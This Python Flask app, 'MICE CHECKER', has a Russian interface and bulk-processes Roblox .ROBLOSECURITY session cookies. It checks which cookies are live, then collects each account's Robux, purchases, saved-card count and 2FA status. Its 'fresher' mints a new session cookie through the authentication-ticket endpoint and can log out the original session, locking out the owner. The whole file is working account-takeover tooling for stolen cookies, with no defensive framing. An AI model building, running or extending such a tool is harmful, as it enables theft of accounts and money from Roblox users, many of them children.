import os
import time
import logging
import re
import urllib3
import json
import requests
import zipfile
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify, send_from_directory
from io import BytesIO

# ===== НАСТРОЙКИ =====
os.makedirs("downloads", exist_ok=True)
os.makedirs("uploads", exist_ok=True)
os.makedirs("temp", exist_ok=True)
os.makedirs("history", exist_ok=True)

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

CURRENT_UPLOADED_FILE = None
CHECKER_HISTORY_FILE = "history/checker_history.json"
FRESHER_HISTORY_FILE = "history/fresher_history.json"

# ============================================================
# ФУНКЦИИ ИСТОРИИ И ОЧИСТКИ КУКОВ
# ============================================================

def load_history(filepath):
    if not os.path.exists(filepath):
        return []
    try:
        with open(filepath, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return []

def save_history(filepath, data):
    try:
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
    except Exception as e:
        logger.error(f"Error saving history: {e}")

def clean_single_cookie(cookie: str) -> str:
    cleaned = cookie.strip()
    if ".ROBLOSECURITY=" in cleaned:
        cleaned = cleaned.split(".ROBLOSECURITY=")[1].split(";")[0].strip()
    return cleaned

# ============================================================
# ВАЛИДАТОР И ИНФО О КУКАХ
# ============================================================

def validate_cookie(cookie: str) -> dict:
    """Быстрый валидатор сессии (возвращает статус и базовый инфо)"""
    clean_cookie = clean_single_cookie(cookie)
    if not clean_cookie:
        return {'valid': False, 'username': 'N/A', 'id': 'N/A', 'cookie': cookie}
    try:
        r = requests.get(
            'https://users.roblox.com/v1/users/authenticated',
            cookies={'.ROBLOSECURITY': clean_cookie},
            headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'},
            timeout=8,
            verify=False
        )
        if r.status_code == 200 and 'id' in r.json():
            data = r.json()
            return {
                'valid': True,
                'username': data.get('name', 'Unknown'),
                'id': data.get('id', 'Unknown'),
                'cookie': f".ROBLOSECURITY={clean_cookie}"
            }
    except Exception as e:
        logger.error(f"Validation error: {e}")
    return {'valid': False, 'username': 'N/A', 'id': 'N/A', 'cookie': f".ROBLOSECURITY={clean_cookie}"}

def get_full_info(cookie: str) -> dict:
    cleaned_cookie = clean_single_cookie(cookie)
    info = {
        'status': '⚠️', 'Username': '?', 'UserID': '?', 'Robux': 0,
        'TotalRAP': 0, 'Created': '?', 'Country': '?',
        'EmailSet': False, 'TwoFactorEnabled': False,
        'AccountPinEnabled': False, 'PhoneSet': False,
        'SecurityStatus': '⚠️ НИЗКИЙ', 'Cookie': f".ROBLOSECURITY={cleaned_cookie}",
        'PurchasedGamepasses': {}, 'CreditCardsCount': 0,
        'IsPremium': False, 'DonationTotal': 0
    }
    try:
        s = requests.Session()
        s.headers.update({
            'Cookie': f'.ROBLOSECURITY={cleaned_cookie}',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json'
        })
        
        r = s.get('https://users.roblox.com/v1/users/authenticated', timeout=12, verify=False)
        if r.status_code == 200 and 'id' in r.json():
            d = r.json()
            info['UserID'] = d.get('id')
            info['Username'] = d.get('name')
            info['status'] = '✅'
        else:
            info['status'] = '❌'
            return info

        uid = info['UserID']

        def g(url):
            try:
                r = s.get(url, verify=False, timeout=8)
                return r.json() if r.status_code == 200 else {}
            except:
                return {}

        d = g('https://www.roblox.com/my/settings/json')
        if d:
            sec = d.get('MyAccountSecurityModel', {})
            info['EmailSet'] = sec.get('IsEmailSet', False)
            info['TwoFactorEnabled'] = sec.get('IsTwoStepEnabled', False)
            info['AccountPinEnabled'] = sec.get('IsAccountPinEnabled', False)
            info['PhoneSet'] = sec.get('IsPhoneSet', False)
            bill = d.get('BillingModel', {})
            info['CreditCardsCount'] = len(bill.get('SavedPaymentMethods', []))

        prem = g(f'https://premiumfeatures.roblox.com/v1/users/{uid}/subscriptions')
        if prem and prem.get('isSubscribed'):
            info['IsPremium'] = True

        rd = g(f'https://users.roblox.com/v1/users/{uid}')
        if rd:
            try:
                dt = datetime.fromisoformat(rd.get('created', '').replace('Z', '+00:00'))
                info['Created'] = dt.strftime('%d.%m.%Y')
            except:
                pass

        rb = g(f'https://economy.roblox.com/v1/users/{uid}/currency')
        if rb:
            info['Robux'] = rb.get('robux', 0)

        country = g('https://users.roblox.com/v1/users/authenticated/country-code')
        if country:
            info['Country'] = country.get('countryCode', '?')

        try:
            gp_url = f"https://economy.roblox.com/v2/users/{uid}/transactions?limit=100&transactionType=Purchase"
            cursor = ""
            page = 0
            gamepasses_dict = {}
            total_donated = 0
            while page < 8:
                url = gp_url + f"&cursor={cursor}" if cursor else gp_url
                r = s.get(url, verify=False, timeout=10)
                if r.status_code != 200:
                    break
                data = r.json()
                for item in data.get('data', []):
                    details = item.get('details', {})
                    price = abs(item.get('currency', {}).get('amount', 0))
                    total_donated += price
                    if price >= 50:
                        name = details.get('name', 'Товар')
                        place = details.get('place', {})
                        place_name = place.get('name', 'Другие игры')
                        if place_name not in gamepasses_dict:
                            gamepasses_dict[place_name] = []
                        gamepasses_dict[place_name].append({'name': name, 'price': price})
                cursor = data.get('nextPageCursor')
                if not cursor:
                    break
                page += 1
                time.sleep(0.1)
            info['PurchasedGamepasses'] = gamepasses_dict
            info['DonationTotal'] = total_donated
        except:
            pass

        score = 0
        if info['EmailSet']: score += 1
        if info['TwoFactorEnabled']: score += 2
        if info['AccountPinEnabled']: score += 1
        if info['PhoneSet']: score += 1
        info['SecurityStatus'] = '🔒 ВЫСОКИЙ' if score >= 4 else ('🔐 СРЕДНИЙ' if score >= 2 else '⚠️ НИЗКИЙ')
    except Exception as e:
        logger.error(f"Check error: {e}")
        info['status'] = '❌'
    return info

def refresh_roblox_cookie(raw_cookie: str, mode: str = "duplicate") -> str:
    clean_cookie = clean_single_cookie(raw_cookie)
    if not clean_cookie:
        return None

    vres = validate_cookie(clean_cookie)
    if not vres['valid']:
        return None

    s = requests.Session()
    s.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
        'Referer': 'https://www.roblox.com/',
        'Origin': 'https://www.roblox.com'
    })
    s.cookies.set(".ROBLOSECURITY", clean_cookie, domain=".roblox.com")

    try:
        res = s.post("https://auth.roblox.com/v2/login", verify=False, timeout=10)
        csrf_token = res.headers.get("x-csrf-token")
        if not csrf_token:
            return None
        s.headers["X-CSRF-TOKEN"] = csrf_token

        ticket_res = s.post("https://auth.roblox.com/v1/authentication-ticket", verify=False, timeout=10)
        auth_ticket = ticket_res.headers.get("rbx-authentication-ticket")
        if not auth_ticket:
            return None

        redeem_headers = {
            'RBX-For-Game-Auth': 'true',
            'RBX-Authentication-Ticket': auth_ticket,
            'Content-Type': 'application/json',
            'X-CSRF-TOKEN': csrf_token
        }
        
        redeem_res = s.post(
            "https://auth.roblox.com/v1/authentication-ticket/redeem",
            json={"authenticationTicket": auth_ticket},
            headers=redeem_headers,
            verify=False,
            timeout=10
        )

        new_cookie_val = None
        for cookie in redeem_res.cookies:
            if cookie.name == ".ROBLOSECURITY":
                new_cookie_val = cookie.value
                break

        if not new_cookie_val and "Set-Cookie" in redeem_res.headers:
            match = re.search(r'\.ROBLOSECURITY=(_\|WARNING:-DO-NOT-SHARE-THIS[^\s;]+)', redeem_res.headers["Set-Cookie"])
            if match:
                new_cookie_val = match.group(1)

        if not new_cookie_val:
            return None

        formatted_new_cookie = f".ROBLOSECURITY={new_cookie_val}"
        
        if not validate_cookie(new_cookie_val)['valid']:
            return None

        if mode == "kill":
            try:
                s.post("https://auth.roblox.com/v2/logout", verify=False, timeout=5)
            except Exception as e:
                logger.error(f"Error logout: {e}")

        return formatted_new_cookie
    except Exception as e:
        logger.error(f"Fresher exception: {e}")
        return None

def format_short_report(info):
    if info['status'] != '✅':
        return f"❌ Невалидный кук\nCookie: {info['Cookie']}"
    gp = info.get('PurchasedGamepasses', {})
    total_gp = sum(p['price'] for passes in gp.values() for p in passes)
    r = f"📋 {info['Username']} [{info['UserID']}]\n"
    r += f"🟢 VALID | 📅 {info['Created']} | 🌍 {info['Country']}\n"
    r += f"💰 Robux: ⏣ {info['Robux']:,} | 💸 Донат: ⏣ {info['DonationTotal']:,}\n"
    r += f"🛡️ Почта: {'✅' if info['EmailSet'] else '❌'} | 2FA: {'✅' if info['TwoFactorEnabled'] else '❌'} | {info['SecurityStatus']}\n"
    if gp:
        r += f"📦 ГЕЙМПАССЫ ({total_gp:,} R$):\n"
        for game, passes in list(gp.items())[:3]:
            r += f"   🎮 {game}:\n"
            for p in passes[:6]:
                r += f"      └ {p['name']} — ⏣ {p['price']:,}\n"
    r += f"\n🍪 COOKIE:\n{info['Cookie']}"
    return r

def generate_full_txt_report(info):
    if info['status'] != '✅':
        return f"❌ Невалидный кук\nCookie: {info['Cookie']}"
    gp = info.get('PurchasedGamepasses', {})
    r = "=" * 60 + "\n"
    r += f"ROBLOX COOKIE CHECK REPORT\n"
    r += "=" * 60 + "\n"
    r += f"Аккаунт: {info['Username']} [{info['UserID']}]\n"
    r += f"Создан: {info['Created']} | Страна: {info['Country']}\n"
    r += f"Robux: {info['Robux']:,} | Донат: {info['DonationTotal']:,}\n"
    r += f"Premium: {'Да' if info['IsPremium'] else 'Нет'} | Карты: {info['CreditCardsCount']}\n"
    r += f"Почта: {'Да' if info['EmailSet'] else 'Нет'} | 2FA: {'Да' if info['TwoFactorEnabled'] else 'Нет'}\n"
    r += "=" * 60 + "\n"
    if gp:
        r += "ГЕЙМПАССЫ:\n"
        for game, passes in gp.items():
            for p in passes:
                r += f"  {game} - {p['name']} ({p['price']} R$)\n"
    r += "=" * 60 + "\n"
    r += f"COOKIE:\n{info['Cookie']}\n"
    r += f"\nGenerated: {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}"
    return r

# ============================================================
# FLASK APPLICATION
# ============================================================

app = Flask(__name__)

HTML = r"""<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>mice checker PRO</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;900&display=swap" rel="stylesheet">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{
            font-family:'Inter',sans-serif;
            min-height:100vh;
            padding:24px;
            background:#0b081a;
            background-image:radial-gradient(circle at 10% 20%, #1a1040 0%, #0b081a 80%);
        }
        .wrapper{
            max-width:1400px;
            margin:0 auto;
            padding:30px;
            background:rgba(18,10,40,0.95);
            border:2px solid #6c5ce7;
            border-radius:32px;
            box-shadow:0 0 60px rgba(108,92,231,0.25);
        }
        ::-webkit-scrollbar{width:6px;height:6px}
        ::-webkit-scrollbar-track{background:#0d0722;border-radius:8px}
        ::-webkit-scrollbar-thumb{background:#a855f7;border-radius:8px}
        .header{
            display:flex;
            justify-content:space-between;
            align-items:center;
            padding:20px 0 16px;
            border-bottom:1px solid #2a1a50;
            margin-bottom:30px;
        }
        .logo{
            font-size:34px;
            font-weight:900;
            font-style:italic;
            background:linear-gradient(135deg,#c084fc,#f472b6);
            -webkit-background-clip:text;
            -webkit-text-fill-color:transparent;
        }
        .tabs{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:28px}
        .tab{
            padding:10px 22px;
            background:rgba(26,16,64,0.9);
            border:1px solid #2a1a50;
            border-radius:40px;
            color:#9880c0;
            cursor:pointer;
            font-size:14px;
            font-weight:600;
            transition:all 0.25s;
            user-select:none;
        }
        .tab:hover{border-color:#a855f7;color:#fff;transform:translateY(-2px)}
        .tab.active{
            border-color:#c084fc;
            background:rgba(168,85,247,0.3);
            color:#c084fc;
            box-shadow:0 0 20px rgba(168,85,247,0.2);
        }
        .tab-content{display:none}
        .tab-content.active{display:block;animation:fadeUp 0.3s ease}
        @keyframes fadeUp{
            0%{opacity:0;transform:translateY(12px)}
            100%{opacity:1;transform:translateY(0)}
        }
        .card{
            background:rgba(18,10,40,0.9);
            border:1px solid #2a1a50;
            border-radius:20px;
            padding:28px 30px;
            margin-bottom:24px;
            box-shadow:0 20px 40px rgba(0,0,0,0.6);
        }
        .card h2{
            font-size:20px;
            color:#d4c0ff;
            margin-bottom:18px;
            display:flex;
            align-items:center;
            gap:10px;
            font-weight:700;
        }
        .btn{
            padding:12px 28px;
            border:none;
            border-radius:40px;
            font-size:14px;
            font-weight:700;
            cursor:pointer;
            transition:all 0.25s;
            display:inline-flex;
            align-items:center;
            gap:10px;
            text-decoration:none;
            color:#fff;
        }
        .btn-primary{
            background:linear-gradient(135deg,#a855f7,#d946ef);
            box-shadow:0 8px 24px rgba(168,85,247,0.25);
        }
        .btn-primary:hover{transform:translateY(-2px);box-shadow:0 12px 32px rgba(168,85,247,0.4)}
        .btn-secondary{
            background:rgba(255,255,255,0.06);
            border:1px solid #2a1a50;
            color:#d4c0ff;
        }
        .btn-secondary:hover{background:rgba(255,255,255,0.1)}
        .btn-danger{
            background:rgba(220,38,38,0.2);
            border:1px solid rgba(220,38,38,0.3);
            color:#fca5a5;
        }
        .btn-danger:hover{background:rgba(220,38,38,0.3)}
        .toggle-group{
            display:flex;
            background:#0d0722;
            border:1px solid #2a1a50;
            border-radius:16px;
            padding:4px;
            gap:4px;
            margin-bottom:18px;
        }
        .toggle-btn{
            flex:1;
            padding:12px 16px;
            background:transparent;
            border:none;
            border-radius:12px;
            color:#9880c0;
            font-size:13px;
            font-weight:600;
            cursor:pointer;
            transition:all 0.25s;
            text-align:center;
        }
        .toggle-btn.active{
            background:linear-gradient(135deg,rgba(168,85,247,0.3),rgba(217,70,239,0.3));
            color:#c084fc;
            border:1px solid rgba(192,132,252,0.4);
            box-shadow:0 4px 15px rgba(168,85,247,0.2);
        }
        textarea,.upload-area{
            width:100%;
            padding:14px 16px;
            background:#0d0722;
            border:1px solid #2a1a50;
            border-radius:14px;
            color:#fff;
            font-family:'Inter',monospace;
            font-size:14px;
            resize:vertical;
            transition:0.2s;
        }
        textarea:focus,.upload-area:focus-within{
            border-color:#a855f7;
            outline:none;
            box-shadow:0 0 0 3px rgba(168,85,247,0.2);
        }
        .upload-area{
            min-height:100px;
            display:flex;
            flex-direction:column;
            align-items:center;
            justify-content:center;
            cursor:pointer;
            border-style:dashed;
            gap:6px;
            text-align:center;
        }
        .result-box{
            background:#0d0722;
            border:1px solid #2a1a50;
            border-radius:16px;
            padding:18px;
            margin-top:20px;
            max-height:500px;
            overflow-y:auto;
            font-family:'Inter',monospace;
            font-size:13px;
            color:#fff;
            white-space:pre-wrap;
            word-break:break-all;
        }
        .footer{
            text-align:center;
            padding:30px 0 12px;
            color:#4a3a6a;
            font-size:13px;
            border-top:1px solid #1a1040;
            margin-top:30px;
        }
        .flex-row{display:flex;flex-wrap:wrap;gap:18px}
        .flex-2{flex:2}
        .flex-1{flex:1}
        .mt-18{margin-top:18px}
        .gap-12{display:flex;gap:12px;flex-wrap:wrap}
        .timer{
            color:#00b894;
            font-family:'Inter',monospace;
            font-weight:600;
            font-size:13px;
            background:rgba(0,184,148,0.1);
            padding:4px 10px;
            border-radius:12px;
            border:1px solid rgba(0,184,148,0.2);
        }
        .badge{color:#4a3a6a;font-size:14px}
    </style>
</head>
<body>
<div class="wrapper">
    <div class="header">
        <div class="logo">MICE CHECKER</div>
        <div style="display:flex;align-items:center;gap:15px;">
            <span class="timer" id="sessionTimer">⏱️ 00:00:00</span>
            <span class="badge">⚡ PRO</span>
        </div>
    </div>

    <div class="tabs">
        <div class="tab active" data-tab="validator">⚡ Валидатор</div>
        <div class="tab" data-tab="checker">🔍 Глубокий Чекер</div>
        <div class="tab" data-tab="fresher">🔄 Фрешер</div>
    </div>

    <!-- 1. ВАЛИДАТОР -->
    <div class="tab-content active" id="tab-validator">
        <div class="card">
            <h2>⚡ Экспресс-Валидатор (Быстрая проверка)</h2>
            <div class="flex-row">
                <div class="flex-2">
                    <textarea id="validatorCookies" placeholder="Вставьте куки (по 1 в строке)..." rows="6"></textarea>
                </div>
                <div class="flex-1">
                    <div class="upload-area" onclick="document.getElementById('validatorFile').click()">
                        <p>📁 <strong>Загрузить .txt</strong></p>
                    </div>
                    <input type="file" id="validatorFile" accept=".txt" style="display:none;">
                </div>
            </div>
            <div class="mt-18 gap-12">
                <button class="btn btn-primary" onclick="runValidator()">⚡ Проверить валидность</button>
                <button class="btn btn-secondary" onclick="document.getElementById('validatorCookies').value='';document.getElementById('validatorResult').textContent='Результаты появятся здесь...';">🧹 Очистить</button>
            </div>
            <div class="result-box" id="validatorResult">Результаты проверки валидности...</div>
        </div>
    </div>

    <!-- 2. ГЛУБОКИЙ ЧЕКЕР -->
    <div class="tab-content" id="tab-checker">
        <div class="card">
            <h2>🔍 Глубокая проверка (Геймпассы + Донаты)</h2>
            <div class="flex-row">
                <div class="flex-2">
                    <textarea id="manualCookies" placeholder="Вставьте куки..." rows="6"></textarea>
                </div>
                <div class="flex-1">
                    <div class="upload-area" onclick="document.getElementById('fullFile').click()">
                        <p>📁 <strong>Загрузить .txt</strong></p>
                    </div>
                    <input type="file" id="fullFile" accept=".txt" style="display:none;">
                </div>
            </div>
            <div class="mt-18 gap-12">
                <button class="btn btn-primary" onclick="runFullcheck()">🚀 Запустить чекер</button>
                <button class="btn btn-secondary" onclick="document.getElementById('manualCookies').value='';">🧹 Очистить</button>
            </div>
            <div class="result-box" id="fullcheckResult">Результаты чекера появятся здесь...</div>
        </div>
    </div>

    <!-- 3. ФРЕШЕР -->
    <div class="tab-content" id="tab-fresher">
        <div class="card">
            <h2>🔄 Фрешер сессий</h2>
            <div class="toggle-group">
                <button class="toggle-btn active" id="modeDuplicate" onclick="setFresherMode('duplicate')">♻️ Дублировать</button>
                <button class="toggle-btn" id="modeKill" onclick="setFresherMode('kill')">💀 Сбросить сессию</button>
            </div>
            <input type="hidden" id="fresherMode" value="duplicate">
            <textarea id="fresherCookies" placeholder="Вставьте куки для смены сессии..." rows="6"></textarea>
            <div class="mt-18 gap-12">
                <button class="btn btn-primary" onclick="runFresher()">⚡ Обновить куки</button>
            </div>
            <div class="result-box" id="fresherResult">Результаты фрешера...</div>
        </div>
    </div>

    <div class="footer">MICE CHECKER · 2026 PRO</div>
</div>

<script>
// Таймер
let startTime = Date.now();
setInterval(() => {
    let d = Math.floor((Date.now() - startTime) / 1000);
    let h = String(Math.floor(d / 3600)).padStart(2, '0');
    let m = String(Math.floor((d % 3600) / 60)).padStart(2, '0');
    let s = String(d % 60).padStart(2, '0');
    document.getElementById('sessionTimer').textContent = '⏱️ ' + h + ':' + m + ':' + s;
}, 1000);

// Табы
document.querySelectorAll('.tab').forEach(tab => {
    tab.addEventListener('click', function() {
        let tabId = this.getAttribute('data-tab');
        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
        document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
        this.classList.add('active');
        document.getElementById('tab-' + tabId).classList.add('active');
    });
});

function setFresherMode(mode) {
    document.getElementById('fresherMode').value = mode;
    document.getElementById('modeDuplicate').classList.toggle('active', mode === 'duplicate');
    document.getElementById('modeKill').classList.toggle('active', mode === 'kill');
}

// Загрузка файлов
document.getElementById('validatorFile').addEventListener('change', function() {
    if (this.files[0]) {
        let r = new FileReader();
        r.onload = e => document.getElementById('validatorCookies').value = e.target.result;
        r.readAsText(this.files[0]);
    }
});

// API запросы
async function runValidator() {
    let box = document.getElementById('validatorResult');
    let cookies = document.getElementById('validatorCookies').value.trim();
    if (!cookies) return box.textContent = '❌ Вставьте куки!';
    box.textContent = '⏳ Быстрая проверка валидности...';
    
    let r = await fetch('/api/validate', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ cookies: cookies })
    });
    let d = await r.json();
    if (d.success) {
        let html = `📊 Всего: ${d.total} | 🟢 Валид: ${d.valid_count} | 🔴 Невалид: ${d.invalid_count}\n\n`;
        d.results.forEach(item => {
            if (item.valid) {
                html += `✅ VALID | ${item.username} [ID: ${item.id}]\nCookie: ${item.cookie}\n\n`;
            } else {
                html += `❌ INVALID | Cookie: ${item.cookie.substring(0, 40)}...\n\n`;
            }
        });
        box.textContent = html;
    } else {
        box.textContent = '❌ Ошибка';
    }
}

async function runFullcheck() {
    let box = document.getElementById('fullcheckResult');
    let cookies = document.getElementById('manualCookies').value.trim();
    if (!cookies) return box.textContent = '❌ Вставьте куки!';
    box.textContent = '⏳ Проверка геймпассов и донатов...';
    let fd = new FormData();
    fd.append('file', new Blob([cookies], {type: 'text/plain'}), 'manual.txt');
    let r = await fetch('/api/fullcheck', { method: 'POST', body: fd });
    let d = await r.json();
    if (d.success) {
        let html = `✅ Проверено: ${d.total} | Валидных: ${d.valid_count}\n\n`;
        d.reports.forEach(rep => html += rep + '\n-------------------\n');
        box.textContent = html;
    }
}

async function runFresher() {
    let box = document.getElementById('fresherResult');
    let cookies = document.getElementById('fresherCookies').value.trim();
    let mode = document.getElementById('fresherMode').value;
    if (!cookies) return box.textContent = '❌ Вставьте куки!';
    box.textContent = '⏳ Обновление сессий...';
    let r = await fetch('/api/fresher', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ cookies: cookies, mode: mode })
    });
    let d = await r.json();
    if (d.success) {
        box.textContent = d.cookies_only.join('\n');
    } else {
        box.textContent = '❌ ' + d.message;
    }
}
</script>
</body>
</html>"""

# ============================================================
# API ROUTES
# ============================================================

@app.route("/")
def index():
    return render_template_string(HTML)

@app.route("/api/validate", methods=["POST"])
def api_validate():
    """Отдельный API Endpoint для работы ВАЛИДАТОРА"""
    data = request.json or {}
    raw = data.get("cookies", "")
    lines = [l.strip() for l in raw.split('\n') if len(l.strip()) > 20]
    
    if not lines:
        return jsonify({"success": False, "message": "Куки не найдены"})
    
    results = []
    valid_cnt = 0
    
    for c in lines:
        res = validate_cookie(c)
        results.append(res)
        if res['valid']:
            valid_cnt += 1
            
    return jsonify({
        "success": True,
        "total": len(lines),
        "valid_count": valid_cnt,
        "invalid_count": len(lines) - valid_cnt,
        "results": results
    })

@app.route("/api/fullcheck", methods=["POST"])
def api_fullcheck():
    content = ""
    if 'file' in request.files:
        content = request.files['file'].read().decode('utf-8', errors='ignore')
    
    cookies = [line.strip() for line in content.split('\n') if len(line.strip()) > 20]
    if not cookies:
        return jsonify({"success": False, "message": "Куки не найдены"})
    
    reports = []
    for c in cookies:
        info = get_full_info(c)
        if info['status'] == '✅':
            reports.append(format_short_report(info))
    
    return jsonify({
        "success": True,
        "total": len(cookies),
        "valid_count": len(reports),
        "reports": reports
    })

@app.route("/api/fresher", methods=["POST"])
def api_fresher():
    data = request.json or {}
    raw = data.get("cookies", "")
    mode = data.get("mode", "duplicate")
    
    cookies = [line.strip() for line in raw.split('\n') if len(line.strip()) > 20]
    if not cookies:
        return jsonify({"success": False, "message": "Куки не найдены"})
    
    cookies_only = []
    for c in cookies:
        refreshed_cookie = refresh_roblox_cookie(c, mode=mode)
        if refreshed_cookie:
            cookies_only.append(refreshed_cookie)
    
    if not cookies_only:
        return jsonify({"success": False, "message": "Куки сброшены или не проходят валидацию."})

    return jsonify({
        "success": True,
        "cookies_only": cookies_only
    })

if __name__ == "__main__":
    app.run(debug=True, port=5000)
